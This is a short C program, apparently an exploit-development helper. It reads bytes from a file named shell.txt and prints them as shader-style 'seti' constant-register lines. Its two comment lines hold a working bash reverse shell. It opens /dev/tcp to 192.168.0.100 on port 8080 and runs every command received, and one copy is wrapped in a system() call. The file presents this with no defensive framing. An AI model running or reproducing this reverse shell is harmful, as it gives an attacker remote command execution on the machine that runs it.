#include <stdio.h>
#include <stdint.h>
#include <stdlib.h>
#include <string.h>

int main() 
{
	// echo 'exec 5<>/dev/tcp/192.168.0.100/8080;cat <&5 | while read line; do $line 2>&5 >&5; done' > shell; bash shell
	//system("echo 'exec 5<>/dev/tcp/192.168.0.100/8080;cat <&5 | while read line; do $line 2>&5 >&5; done' > shell; bash shell");
	FILE* f = fopen( "shell.txt", "r" );
	int32_t data[ 32 ];
	memset( data, 0, 32 * 4 );
	fread( &data[ 0 ], 32 * 4, 1, f );
	
	for( int i = 0, j = 0; i < 32; i += 4, j++ )
		printf( "seti c%d.xyzw %d %d %d %d\n", j, data[ i ], data[ i + 1 ], data[ i + 2 ], data[ i + 3 ] );
	
	return 0;
}
